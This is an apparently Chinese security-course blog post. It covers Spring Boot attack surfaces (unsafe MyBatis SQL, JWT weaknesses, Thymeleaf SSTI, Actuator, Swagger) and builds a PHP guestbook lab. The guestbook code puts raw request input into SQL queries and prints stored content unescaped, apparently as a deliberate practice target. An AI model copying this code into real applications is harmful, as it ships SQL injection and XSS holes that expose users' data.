<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h4 id="框架类-SpringBoot"><a href="#框架类-SpringBoot" class="headerlink" title="框架类-SpringBoot"></a>框架类-SpringBoot</h4><pre><code class="hljs">    Spring Boot是由Pivotal团队提供的一套开源框架，可以简化spring应用的创建及部署。它提供了丰富的Spring模块化支持，可以帮助开发者更轻松快捷地构建出企业级应用。Spring Boot通过自动配置功能，降低了复杂性，同时支持基于JVM的多种开源框架，可以缩短开发时间，使开发更加简单和高效。
</code></pre>
<p>参考：<a target="_blank" rel="noopener" href="https://springdoc.cn/spring-boot/">Spring Boot 中文文档 (springdoc.cn)</a></p>
<p>‍</p>
<h5 id="原生"><a href="#原生" class="headerlink" title="原生"></a>原生</h5><p>‍</p>
<h6 id="路由响应"><a href="#路由响应" class="headerlink" title="路由响应"></a>路由响应</h6><ul>
<li><p>数据响应</p>
<p><code>@Controller</code>​ 通常用于标识传统的<strong>MVC控制器</strong>，而 <code>@RestController</code>​ 更适用于RESTful风格的控制器。</p>
</li>
<li><p><code>@ResponseBody</code>​ 表示方法的<strong>返回值</strong>将直接作为HTTP响应体返回给客户端。</p>
<p><code>@RestController</code>​（自带回显）注解用于标识一个类是RESTful风格的控制器，它包含了 <code>@ResponseBody</code>​ 和 <code>@Controller</code>​ 的功能。</p>
</li>
<li><p>参数传递</p>
<p><code>@RequestParam</code>​注解用于从HTTP请求中提取参数，使得控制器方法可以访问并使用这些参数。</p>
</li>
<li><p>路由映射</p>
<p><code>@RequestMapping</code>​，<code>@GetMapping</code>​和<code>@PostMapping</code>​注解用于定义HTTP请求的映射路径。</p>
</li>
</ul>
<p>‍</p>
<h6 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h6><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52514893/article/details/135189009?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172129560516800222863206%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172129560516800222863206&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-135189009-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=java%20Mybatis&spm=1018.2226.3001.4187">Java经典框架之MyBatis_java mybatis-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7201831345415749692">MyBatis教程（看这一篇就够了）入门到精通 - 掘金 (juejin.cn)</a></p>
<p>SQL三种不安全写法</p>
<ol>
<li><code>&#39;%#&#123;title&#125;%</code>​</li>
<li><code>in (#&#123;ids&#125;)</code>​</li>
<li><code>order by</code>​之后</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h6 id="JWT—身份鉴权"><a href="#JWT—身份鉴权" class="headerlink" title="JWT—身份鉴权"></a>JWT—身份鉴权</h6><ul>
<li><p>JWT ( JSON  Web Token ) 是由服务端用加密算法对信息签名来保证其完整性和不可伪造；</p>
</li>
<li><p>Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息；</p>
</li>
<li><p>JWT用于身份认证、会话维持等。由三部分<strong>组成</strong>，header、payload与signature。</p>
<p>JWT 是由这三个部分组成的字符串，<strong>格式</strong>形如 <code>header.payload.signature</code>​</p>
<ul>
<li><p><strong>Header（头部）：</strong>  JWT 的头部通常包含两部分信息：<strong>声明类型（typ）和使用的签名算法（alg）</strong> 。这些信息以 JSON 格式存在，然后进行 Base64 编码，形成 JWT 的第一个部分。头部用于描述关于该 JWT 的元数据信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p><strong>Payload（负载）：</strong>  JWT 的负载包含有关 <strong>JWT 主题（subject）及其它声明的信息</strong>。与头部一样，负载也是以 JSON 格式存在，然后进行 Base64 编码，形成 JWT 的第二个部分。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1234567890&quot;</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1516239022</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p><strong>Signature（签名）：</strong>  JWT 的签名是由<strong>头部、负载以及一个密钥生成的</strong>，用于验证 JWT 的真实性和完整性。签名是由指定的签名算法对经过 Base64 编码的头部和负载组合而成的字符串进行签名生成的。</p>
<p>例如，使用 HMAC SHA-256 算法生成签名：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HMACSHA256(<br>  base64UrlEncode(header) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(payload),<br>  secret<br>)<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p><img src="/assets/image-20240718174543-ed9t1pd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>服务器只负责token创建和验证功能，没有储存所以可以有效规避CSRF漏洞的产生</p>
<p>安全问题：密匙泄露，加密NONE，CVE漏洞</p>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1802761">安全攻防 | JWT认知与攻击-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><p>‍</p>
<h6 id="模板Thymeleaf"><a href="#模板Thymeleaf" class="headerlink" title="模板Thymeleaf"></a>模板Thymeleaf</h6><ul>
<li>原生开发-不安全写法-SSTI注入</li>
<li>原生开发-库本身漏洞-CVE</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg">thymeleaf模板注入学习与研究–查找与防御 (qq.com)</a></p>
<p>‍</p>
<p>‍</p>
<h5 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h5><p>‍</p>
<h6 id="Actuator"><a href="#Actuator" class="headerlink" title="Actuator"></a>Actuator</h6><ul>
<li><p>概念</p>
<p>框架自带的监控组件，用来分析项目</p>
<p>Actutor断点图</p>
<p><img src="/assets/image-20240718002707-p1mv3n3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>监控系统</p>
<p>heapdump泄露利用</p>
<p>本身泄露类上漏洞利用cve</p>
</li>
</ul>
<p>‍</p>
<h6 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h6><ul>
<li><p>概念</p>
<p>Swagger是当下比较流行的实时接口文文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，&#x3D;&#x3D;<strong>双方开发结束后在进行联调测试。</strong>&#x3D;&#x3D;</p>
<p>方便项目人员对项目的各种API接口的测试</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lsqingfeng/article/details/123678701">SpringBoot教程(十六) | SpringBoot集成swagger（全网最全）_springboot swagger-CSDN博客</a></p>
</li>
<li><p>接口系统</p>
<p>自动化测试(发现更多应用的接口数据)</p>
<p>后续讲到联动Burp Xray等进行全自动分析</p>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<h5 id="Springboot部署"><a href="#Springboot部署" class="headerlink" title="Springboot部署"></a>Springboot部署</h5><p>这里只讲最简单的打包方式，不涉及源码脱壳打包那些</p>
<p>打包部署-JAR&amp;WAR</p>
<p>详细步骤见环境复现</p>
<p>‍</p>
<p>‍</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>‍</p>
<h3 id="PHP应用-留言板功能-超全局变量-数据库操作-第三方插件引用"><a href="#PHP应用-留言板功能-超全局变量-数据库操作-第三方插件引用" class="headerlink" title="PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方插件引用"></a>PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方插件引用</h3><ol>
<li><p>数据导入-mysql架构&amp;库表列</p>
<p> 打开phpstudy</p>
<p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-27%20174105-20240627174452-m8qytoc.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-06-27 174105">​</p>
<p> 使用Navicat创建数据库并设置规则</p>
<p> <img src="/assets/image-20240627174840-7wfflk6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 新建表</p>
<p> <img src="/assets/image-20240627175205-pod655p.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 保存表名为gbook</p>
<p> <img src="/assets/image-20240627175305-fpa663k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 使用phpstorm创建新项目</p>
<p> <img src="/assets/image-20240627175417-2hoku68.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 编写代码后显示效果</p>
<p> <img src="/assets/image-20240627181235-iembxtv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 连接数据库查看效果</p>
<p> <img src="/assets/image-20240627182312-njpp84u.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>数据库操作-mysqli函数&amp;增删改查</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据库通信</span><br><span class="hljs-variable">$dbip</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;dome01&#x27;</span>;   <span class="hljs-comment">//固定这四个地址</span><br><br><span class="hljs-comment">//使用该函数来与数据库建立连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbip</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-comment">//判断是否连接成功</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接错误：&quot;</span> .<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());      <span class="hljs-comment">//如果错误就提示，正确不提示</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$u</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>))&#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>))&#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br><br>            <span class="hljs-comment">//查询并显示留言列表</span><br>            <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;);&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;  <span class="hljs-comment">//用户名为空的情况</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
<li><p>数据接收输出-html混编&amp;超全局变量</p>
<ol>
<li><p>新建后台目录和后台文件，专门用于管理留言</p>
<p> <img src="https://img-blog.csdnimg.cn/img_convert/7d8cf827431a7364169dd011ddfc4e9d.png" srcset="/img/loading.gif" lazyload alt="image-20240401222513673">​</p>
</li>
<li><p>由于管理留言麻烦，所以定义一个全局配置文件去连接数据库</p>
<p> <img src="https://img-blog.csdnimg.cn/img_convert/736285b9983c60b46090e27429e5b6f3.png" srcset="/img/loading.gif" lazyload alt="image-20240401222915919">​</p>
</li>
<li><p>在gbook文件里调用config文件</p>
<p> <img src="https://img-blog.csdnimg.cn/img_convert/0e6ea04ef21f431c3cc3717af66606de.png" srcset="/img/loading.gif" lazyload alt="image-20240402012402616">​</p>
</li>
<li><p>在gbook-admin文件里掉用上级目录config文件</p>
<p> <img src="https://img-blog.csdnimg.cn/img_convert/17feda93401a63c84e1e1396c93ecc10.png" srcset="/img/loading.gif" lazyload alt="image-20240402012453285">​</p>
</li>
<li><p>编写删除功能</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;   <span class="hljs-comment">//包含文件</span><br><br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href = &#x27;gbook-admin.php?del = <span class="hljs-subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt; &quot;</span>;   <span class="hljs-comment">//输出一个删除按钮，href写的是当前文件名，del是删除对象，值为用户名</span><br><br>&#125;<br><br><span class="hljs-variable">$delstr</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];     <span class="hljs-comment">//接收del的值，参数名位del</span><br><span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;delete from gbook where username = &#x27;<span class="hljs-subst">$delstr</span>&#x27;;&quot;</span>;<br>        <span class="hljs-comment">//接收完之后要重新组织SQL语句</span><br>        <span class="hljs-comment">//条件是表名为gbook，因为接收的是用户名，所以接收的列名是username，接收的值为delstr</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql2</span>));&#123;      <span class="hljs-comment">//执行该结果并将结果存储在data中,并判断一下返回结果</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>编写留言成功显示功能</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//24-39行就是为了添加留言的功能</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$u</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>)) &#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) &#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//42-55行就是为了显示留言数据的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>))&#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_gbook</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>);<br><br></code></pre></td></tr></table></figure></li>
<li><p>精简代码逻辑，在gbook-admin中调用，测试前端页面无删除按钮，admin页面有删除按钮</p>
<p> <img src="/assets/image-20240627205827-0fa57pz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240627205841-9ud1wqw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p> ‍</p>
</li>
<li><p>第三方插件引用-js传参&amp;函数对象调用</p>
<ol>
<li>在demo01文件夹下创建ueditor文件夹，将ueditor文件放进去实现评论区图片的功能</li>
</ol>
<p> <img src="/assets/image-20240627210039-wxmifxk.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ol start="2">
<li><p>编写编辑器实例化传参</p>
<p> <img src="/assets/image-20240627210211-y7otdb5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>去小皮面板建立站点，将路径指向源代码的位置，再打开网站</p>
<p> <img src="/assets/image-20240627210301-kejt0ne.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240627210340-nxe4uvh.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
</li>
<li><p>最终代码</p>
<p> gbook.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 